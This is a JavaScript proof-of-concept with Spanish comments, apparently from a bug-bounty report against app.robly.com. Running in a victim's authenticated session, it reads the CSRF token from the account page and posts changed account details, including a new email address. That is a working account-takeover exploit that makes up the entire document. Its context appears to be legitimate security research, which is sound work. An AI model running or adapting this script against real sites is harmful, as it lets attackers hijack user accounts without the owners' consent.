(async () => {
  // Paso 1: Hacer GET para obtener la página y extraer csrf-token
  const res = await fetch('https://app.robly.com/my_account/info', {
    credentials: 'include'
  });
  const text = await res.text();

  // Extraer el contenido del meta csrf-token
  const tokenMatch = text.match(/<meta name="csrf-token" content="([^"]+)"/);
  if (!tokenMatch) {
    alert('No se encontró csrf-token');
    return;
  }
  const csrfToken = tokenMatch[1];
  alert('csrf-token: ' + csrfToken);

  // Paso 2: Hacer POST con el token y datos modificados
  const formData = new URLSearchParams();
  formData.append('authenticity_token', csrfToken);
  formData.append('account_name', 'poquita'); // cambia este valor como quieras
  formData.append('first_name', 'poc');
  formData.append('last_name', 'poc');
  formData.append('email', 'jotita3+other34@wearehackerone.com');
  formData.append('phone_number', '');
  formData.append('button', '');

  const postRes = await fetch('https://app.robly.com/my_account/update_account_details', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': 'https://app.robly.com',
      'Referer': 'https://app.robly.com/my_account/info'
    },
    body: formData.toString()
  });

  if (postRes.ok) {
    alert('POST realizado con éxito');
  } else {
    alert('Error en POST: ' + postRes.status);
  }
})();
